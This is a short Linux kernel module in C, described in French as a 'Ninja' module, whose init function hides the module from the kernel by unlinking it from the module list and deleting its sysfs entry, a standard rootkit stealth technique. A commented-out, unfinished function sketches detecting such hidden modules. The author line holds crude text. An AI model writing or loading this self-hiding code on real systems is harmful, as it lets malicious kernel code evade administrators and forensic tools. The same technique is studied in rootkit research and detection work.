#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/list.h>

MODULE_DESCRIPTION("Module du module Ninja pour noyau linux");
MODULE_AUTHOR("AssHole & Houssem, YOUR_ASS & TUNISIE");
MODULE_LICENSE("GPL");

static int hide_me(void)
{
	pr_info("[HIDE ME]\n");
	list_del(&__this_module.list);
	kobject_del(&__this_module.mkobj.kobj);

	pr_info("[HIDE ME] it's done !!\n");
	
	return 0;
}

static void delete_me(void)
{
	pr_info("[DELETE ME]");
}

/* static int detect_hidden_mod(void) */
/* { */
/* 	char *procfs_modules[MAX_MODULE_SIZE]; */
/* 	char *sysfs_modules[MAX_MODULE_SIZE]; */
/* 	int proc_module_index = 0, sys_module_index = 0; */

/* 	struct module *mod; */
/* 	struct list_head *pos; */

/* 	/\* get modules from procfs perspective *\/ */
/* 	list_for_each(pos, &__this_module.list) { */
/* 		mod = list_entry(pos, struct module, list); */
/* 		procfs_modules[proc_module_index++] = mod->name; */
/* 	} */

/* 	/\* get modules from sysfs perspective *\/ */
/* 	struct kobject *kobj; */
/* 	struct kset *kset = __this_module.mkobj.kobj.kset; */

/* 	list_for_each(pos, &kset->list) { */
/* 		kobj = container_of(pos, struct kobject, entry); */
/* 		sysfs_modules[sys_module_index++] = kobj->k_name; */
/* 	} */

/* 	/\* compare the procfs_modules and the sysfs_modules *\/ */
/* 	/\* ... *\/ */
/* } */

module_init(hide_me);
module_exit(delete_me);
